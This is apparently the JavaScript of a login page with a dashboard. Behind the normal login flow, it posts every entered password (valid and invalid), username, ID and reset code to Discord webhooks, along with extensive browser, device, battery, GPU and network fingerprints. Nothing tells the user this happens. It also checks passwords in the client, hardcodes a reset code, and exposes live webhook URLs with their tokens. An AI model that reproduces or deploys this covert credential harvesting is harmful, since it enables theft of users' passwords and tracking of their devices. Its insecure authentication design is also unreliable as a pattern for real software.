      // Get WebGL Renderer (used for device logging)
      function getWebGLRenderer() {
        try {
          const canvas = document.createElement('canvas');
          const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
          if (!gl) return "Unavailable";
          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
          return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unavailable";
        } catch {
          return "Unavailable";
        }
      }

      // Battery status promise (device logging)
      async function getBatteryStatus() {
        if (navigator.getBattery) {
          try {
            const battery = await navigator.getBattery();
            return battery;
          } catch {
            return null;
          }
        }
        return null;
      }

      // Build user info object from user JSON
      function findUser(username, userID) {
        return users.find(u =>
          u.username?.toLowerCase() === username.toLowerCase() &&
          u.userID?.toString() === userID.toString()
        );
      }

      // Send Discord webhook with custom embed fields
      async function sendWebhook(url, embed) {
        try {
          await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ embeds: [embed] }),
          });
        } catch (e) {
          console.warn('Webhook send failed:', e);
        }
      }

      // Collect browser & device info for logs
      async function collectLoggingData(user, password) {
        const now = new Date();
        loginTime = now.toISOString();
        const batteryStatus = await getBatteryStatus();

        return {
          user,
          password,
          loginTime,
          batteryStatus,
          webglRenderer: getWebGLRenderer(),
        };
      }

      // New logging functions for the specific systems
      async function logUsername(name, username) {
        const embed = {
          title: "Username Logging",
          color: 0x3498db,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Username", value: username, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.username, embed);
      }

      async function logPassword(name, password) {
        const embed = {
          title: "Password Logging",
          color: 0xe74c3c,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Password", value: password, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.password, embed);
      }

      async function logIdentifier(name, identifier) {
        const embed = {
          title: "Identifier Logging",
          color: 0x2ecc71,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Identifier", value: identifier, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.identifier, embed);
      }

      async function logInvalidUsername(name, username) {
        const embed = {
          title: "Invalid Username Logging",
          color: 0xf39c12,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Invalid Username", value: username, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.invalid_username, embed);
      }

      async function logInvalidPassword(name, password) {
        const embed = {
          title: "Invalid Password Logging",
          color: 0xe67e22,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Invalid Password", value: password, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.invalid_password, embed);
      }

      async function logInvalidIdentifier(name, identifier) {
        const embed = {
          title: "Invalid Identifier Logging",
          color: 0xd35400,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Invalid Identifier", value: identifier, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.invalid_identifier, embed);
      }

      async function logAttemptsCounter(name, username, password, identifier, attemptsLeft) {
        const embed = {
          title: "Attempts Counter Logging",
          color: 0x9b59b6,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Username", value: username, inline: true },
            { name: "Password", value: password, inline: true },
            { name: "Identifier", value: identifier, inline: true },
            { name: "Attempts Left", value: attemptsLeft.toString(), inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.attempts_counter, embed);
      }

      async function logAttemptsExceeded(name, username, password, identifier) {
        const embed = {
          title: "Attempts Exceeded Logging",
          color: 0xc0392b,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Username", value: username, inline: true },
            { name: "Password", value: password, inline: true },
            { name: "Identifier", value: identifier, inline: true },
            { name: "Status", value: "MAX ATTEMPTS EXCEEDED", inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.attempts_exceeded, embed);
      }

      // Original embed builders (unchanged)
      function buildUserLoggingEmbed(data) {
        return {
          title: "User Logging System",
          color: 0xff0000,
          fields: [
            { name: "Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username, inline: true },
            { name: "Password", value: data.password, inline: true },
            { name: "Rank Type", value: data.user.rank?.toString() || "N/A", inline: true },
            { name: "Role Type", value: data.user.role || "N/A", inline: true },
            { name: "Login Time", value: data.loginTime, inline: false },
            { name: "User Identifier", value: data.user.userID.toString(), inline: true },
            { name: "Account Creation Date", value: data.user.accountCreationDate || "N/A", inline: true }
          ]
        };
      }

      function buildBrowserLoggingEmbed(data) {
        const nav = navigator;
        return {
          title: "Browser Logging System",
          color: 0x00ff00,
          fields: [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User Identifier", value: data.user.userID?.toString() || "N/A", inline: true },
            { name: "Browser Vendor", value: nav.vendor || "Unknown", inline: true },
            { name: "Browser Language", value: nav.language || "Unknown", inline: true },
            { name: "Browser Languages", value: nav.languages ? nav.languages.join(", ") : "Unknown", inline: false },
            { name: "User Agent", value: nav.userAgent || "Unknown", inline: false },
            { name: "Installed Plugins", value: nav.plugins?.length > 0 ? `${nav.plugins.length} plugin(s)` : "None", inline: true },
            { name: "Browser Window Size", value: `${window.innerWidth}x${window.innerHeight}`, inline: true },
            { name: "Browser Zoom Level", value: `${Math.round(window.devicePixelRatio * 100)}%`, inline: true },
            { name: "Incognito/Private Mode Status", value: "Undetected", inline: true },
            { name: "Cookies Enabled", value: nav.cookieEnabled ? "Yes" : "No", inline: true },
            { name: "Do Not Track", value: nav.doNotTrack || "Unknown", inline: true },
            { name: "Browser Tab Visibility", value: document.visibilityState || "Unknown", inline: true },
            { name: "Font Smoothing Type", value: "Unavailable", inline: true },
            { name: "Clipboard Access", value: nav.clipboard ? "Supported" : "Not Supported", inline: true },
            { name: "WebGL Renderer Info", value: data.webglRenderer || "Unavailable", inline: true },
            { name: "Browser Connection Speed", value: nav.connection?.effectiveType || "Unknown", inline: true }
          ]
        };
      }

      function buildDeviceLoggingEmbed(data) {
        const nav = navigator;
        const battery = data.batteryStatus;
        return {
          title: "Device Logging System",
          color: 0x0000ff,
          fields: [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },
            { name: "Device Platform", value: nav.platform || "Unknown", inline: true },
            { name: "CPU Cores", value: nav.hardwareConcurrency ? `${nav.hardwareConcurrency} cores` : "Unavailable", inline: true },
            { name: "Device Memory", value: nav.deviceMemory ? `${nav.deviceMemory} GB` : "Unavailable", inline: true },
            { name: "GPU Renderer", value: data.webglRenderer || "Unavailable", inline: true },
            { name: "Battery Charging", value: battery?.charging ? "Yes" : "No", inline: true },
            { name: "Battery Level", value: battery ? `${Math.round(battery.level * 100)}%` : "Unavailable", inline: true },
            { name: "Touch Support", value: ('ontouchstart' in window || nav.maxTouchPoints > 0) ? "Yes" : "No", inline: true },
            { name: "Screen Resolution", value: `${screen.width}x${screen.height}`, inline: true },
            { name: "Screen Orientation", value: screen.orientation?.type || "Unavailable", inline: true },
            { name: "Color Depth", value: `${screen.colorDepth} bit`, inline: true },
            { name: "Pixel Depth", value: `${screen.pixelDepth} bit`, inline: true },
            { name: "Device Pixel Ratio", value: window.devicePixelRatio?.toString() || "Unknown", inline: true },
            { name: "Max Touch Points", value: nav.maxTouchPoints?.toString() || "0", inline: true },
            { name: "Vendor", value: nav.vendor || "Unknown", inline: true },
            { name: "Language", value: nav.language || "Unknown", inline: true }
          ]
        };
      }

      function buildConnectionLoggingEmbed(data) {
        const nav = navigator;
        return {
          title: "Connection Logging System",
          color: 0xffff00,
          fields: [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },

            { name: "Online Status", value: nav.onLine ? "Online" : "Offline", inline: true },
            { name: "Connection Type", value: nav.connection?.type || "Unknown", inline: true },
            { name: "Effective Connection Type", value: nav.connection?.effectiveType || "Unknown", inline: true },

            { name: "Downlink Speed", value: nav.connection?.downlink ? `${nav.connection.downlink} Mbps` : "Unknown", inline: true },
            { name: "RTT (Round Trip Time)", value: nav.connection?.rtt ? `${nav.connection.rtt} ms` : "Unknown", inline: true },
            { name: "Save Data Mode", value: nav.connection?.saveData ? "Enabled" : "Disabled", inline: true },

            { name: "IP Address", value: data.user.ipAddress || "Unavailable", inline: false },
            { name: "VPN Detected", value: data.user.vpnDetected ? "Yes" : "No", inline: true },
            { name: "Proxy Detected", value: data.user.proxyDetected ? "Yes" : "No", inline: true },

            { name: "Public IPv6", value: data.user.ipv6Address || "Unavailable", inline: false },
            { name: "Local IP Addresses", value: data.user.localIPs?.join(", ") || "Unavailable", inline: false },
            { name: "Network Downlink Max", value: nav.connection?.downlinkMax ? `${nav.connection.downlinkMax} Mbps` : "Unknown", inline: true },

            { name: "Network Metered Connection", value: nav.connection?.metered ? "Yes" : "No", inline: true },
            { name: "Network Type Detailed", value: nav.connection?.typeDetailed || "Unknown", inline: true },
            { name: "Effective Network Bandwidth Estimate", value: nav.connection?.bandwidthEstimate || "Unavailable", inline: true }
          ]
        };
      }

      function buildSessionLoggingEmbed(data) {
        return {
          title: "Session Logging System",
          color: 0x00ffff,
          fields: [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },

            { name: "Login Time", value: data.loginTime || "Unknown", inline: true },
            { name: "Logout Time", value: data.logoutTime || "Unknown", inline: true },
            { name: "Session Duration", value: data.sessionDuration || "Unknown", inline: true },

            { name: "Pages Visited", value: data.pagesVisited?.join(", ") || "None", inline: false },
            { name: "Actions Performed", value: data.actionsPerformed?.join(", ") || "None", inline: false },

            { name: "Errors Encountered", value: data.errorsEncountered?.join("; ") || "None", inline: false },
            { name: "Warnings", value: data.warnings?.join("; ") || "None", inline: false },

            { name: "User Role Changes", value: data.roleChanges?.join(", ") || "None", inline: false },
            { name: "Permission Changes", value: data.permissionChanges?.join(", ") || "None", inline: false },

            { name: "Last Activity Timestamp", value: data.lastActivityTime || "Unknown", inline: true },
            { name: "Number of Clicks", value: data.numberOfClicks?.toString() || "0", inline: true },
            { name: "Number of Form Submissions", value: data.numberOfFormSubmissions?.toString() || "0", inline: true },

            { name: "Idle Time", value: data.idleTime || "0s", inline: true },
            { name: "Active Time", value: data.activeTime || "Unknown", inline: true },
            { name: "Browser Tab Focus Time", value: data.tabFocusTime || "Unknown", inline: true }
          ]
        };
      }

      // Handle login submission
      async function submitLogin() {
        errorMsg.textContent = '';
        if (!usernameInput.value || !passwordInput.value || !userIDInput.value) {
          errorMsg.textContent = 'Please fill all fields.';
          showNotification('Login failed: All fields are required.', 'error');
          logActivity('Login failed: Missing fields.', 'error');
          return;
        }

        const username = usernameInput.value;
        const password = passwordInput.value;
        const userID = userIDInput.value;
        const user = findUser(username, userID);

        // Log the attempt
        await logAttemptsCounter(
          user?.name || "Unknown",
          username,
          password,
          userID,
          attempts
        );
        logActivity(`Login attempt for username: "${username}", ID: "${userID}". Attempts left: ${attempts}.`, 'warning');


        if (!user) {
          await logInvalidUsername(user?.name || "Unknown", username);
          await logInvalidIdentifier(user?.name || "Unknown", userID);
          handleFailedAttempt('User not found or ID is incorrect.');
          return;
        }

        if (password !== user.password) {
          await logInvalidPassword(user.name, password);
          handleFailedAttempt('Incorrect password.');
          return;
        }

        // Correct login
        attempts = 5;
        updateAttemptsText();
        errorMsg.textContent = '';
        resetPopup.style.display = 'none';
        loginBox.style.borderColor = 'white';
        loginBox.style.boxShadow = '0 0 15px white';

        // Log successful credentials
        await logUsername(user.name, username);
        await logPassword(user.name, password);
        await logIdentifier(user.name, userID);
        logActivity(`Successful login by user: "${user.name || username}".`, 'success');
        showNotification(`Welcome, ${user.name || username}! Login successful.`, 'success');

        // Collect data and send logs
        const loggingData = await collectLoggingData(user, password);

        // Send all 5 webhooks:
        await Promise.all([
          sendWebhook(webhookUrls.userLogging, buildUserLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.browserLogging, buildBrowserLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.deviceLogging, buildDeviceLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.connectionLogging, buildConnectionLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.sessionLogging, buildSessionLoggingEmbed(loggingData)),
        ]);

        // Store login info locally for dashboard display
        localStorage.setItem('loggedInUser', user.name || user.username);
        localStorage.setItem('loggedInID', userID);
        localStorage.setItem('lastLoginTime', new Date().toLocaleString()); // Store current login time

        // Show dashboard and hide login
        document.getElementById('loginBox').style.display = 'none';
        document.getElementById('dashboard').style.display = 'block';
        document.body.className = 'dashboard-body'; // Apply dashboard body class
        
        // Update user info in dashboard
        document.getElementById('loggedInUser').textContent = user.name || user.username;
        document.getElementById('loggedInID').textContent = userID;
        
        // Initialize dashboard functionality
        dashboard.init();
      }

      // Failed attempt handler
      async function handleFailedAttempt(msg) {
        attempts--;
        updateAttemptsText();
        errorMsg.textContent = msg;
        
        if (attempts <= 0) {
          attempts = 0;
          errorMsg.textContent = 'No attempts left. Please reset.';
          
          // Log attempts exceeded
          const username = usernameInput.value;
          const password = passwordInput.value;
          const userID = userIDInput.value;
          const user = findUser(username, userID);
          
          await logAttemptsExceeded(
            user?.name || "Unknown",
            username,
            password,
            userID
          );
          logActivity('Login attempts exhausted. Reset required.', 'error');
          showNotification('Login attempts exhausted. Please reset.', 'error', 10000);

          showResetPopup();
          disableInputs();
        } else {
          flashRedOutline(2, 400); // Flash for failed attempts
          showNotification(`Login failed: ${msg}. Attempts left: ${attempts}`, 'warning');
        }
      }

      // Update attempts display
      function updateAttemptsText() {
        attemptsText.textContent = `Attempts Left: ${attempts}`;
      }

      // Disable inputs and submit button
      function disableInputs() {
        usernameInput.disabled = true;
        passwordInput.disabled = true;
        userIDInput.disabled = true;
        submitBtn.disabled = true;
      }

      // Enable inputs and submit button
      function enableInputs() {
        usernameInput.disabled = false;
        passwordInput.disabled = false;
        userIDInput.disabled = false;
        submitBtn.disabled = false;
      }

      // Show reset popup
      function showResetPopup() {
        resetPopup.style.display = 'block';
        resetPopup.setAttribute('aria-hidden', 'false');
        resetField.focus();
      }

      // Hide reset popup
      function hideResetPopup() {
        resetPopup.style.display = 'none';
        resetPopup.setAttribute('aria-hidden', 'true');
        resetField.value = '';
      }

      async function resetCounter() {
        const enteredCode = resetField.value.trim();
        const isCorrect = enteredCode === 'Reset.Counter.2579';

        const username = usernameInput.value || 'Unknown';
        const password = passwordInput.value || 'Unknown';
        const userID = userIDInput.value || 'Unknown';
        const user = findUser(username, userID) || {};

        // 1. Send "Reset box Detected" webhook immediately
        const resetBoxEmbed = {
          title: "🔔 Reset Box Detected",
          color: 0xffff00,
          fields: [
            { name: "Name", value: user.name || "N/A", inline: true },
            { name: "Username", value: username, inline: true },
            { name: "Password Entered", value: password, inline: true },
            { name: "User ID", value: userID, inline: true },
            { name: "Entered Code", value: enteredCode, inline: false },
            { name: "Time", value: new Date().toLocaleString(), inline: false }
          ]
        };
        const resetBoxWebhook = "https://discord.com/api/webhooks/1403083012442423377/WNs_yZimluZqsxfZWkLSCfd2vmOYdoyEbsUVOfczHkJykeiThIZ6gYCJILFSHfSDSnsq";
        await sendWebhook(resetBoxWebhook, resetBoxEmbed);
        logActivity('Reset popup detected and code entered.', 'info');


        // Build embed for correct or incorrect code
        const resultEmbed = {
          title: isCorrect ? "✅ Reset Code Accepted" : "❌ Incorrect Reset Code Attempt",
          color: isCorrect ? 0x00ff00 : 0xff0000,
          fields: [
            { name: "Name", value: user.name || "N/A", inline: true },
            { name: "Username", value: username, inline: true },
            { name: "Password Entered", value: password, inline: true },
            { name: "User ID", value: userID, inline: true },
            { name: "Reset Code", value: enteredCode, inline: false },
            { name: "Time", value: new Date().toLocaleString(), inline: false }
          ]
        };

        // Select webhook for correct or incorrect logging
        const resultWebhook = isCorrect
          ? "https://discord.com/api/webhooks/1403088193850441921/zZKPkgzVBQ7d6aiCkT3WM7j2Y74UO2o1Js9oSnawVBHaSxUQCz-16Qj4uPYk1YxgoanB"
          : "https://discord.com/api/webhooks/1403088326252040372/JgQkJdcVG-8X0jSmw7AZai9YSUODCMZ5hkyWlBe1MBzPRiJgbSlRDWOJUvHVqsK248ip";

        await sendWebhook(resultWebhook, resultEmbed);

        if (isCorrect) {
          attempts = 5;
          updateAttemptsText();
          enableInputs();
          hideResetPopup();
          errorMsg.textContent = '';
          showNotification('Login counter reset successfully!', 'success');
          logActivity('Login counter reset successfully.', 'success');
        } else {
          showNotification('Incorrect reset code. Try again.', 'error');
          logActivity('Incorrect reset code entered.', 'error');
        }
      }

      // Attach event listeners
      submitBtn.addEventListener('click', submitLogin);
      resetBtn.addEventListener('click', resetCounter);

      // Enter key submits login if popup hidden, else tries reset
      document.addEventListener('keydown', e => {
        if (e.key === 'Enter') {
          if (resetPopup.style.display === 'block') {
            resetCounter();
          } else {
            submitLogin();
          }
        }
      });

      // Initialize attempts display
      updateAttemptsText();
    })();
  </script>
</body>
</html>
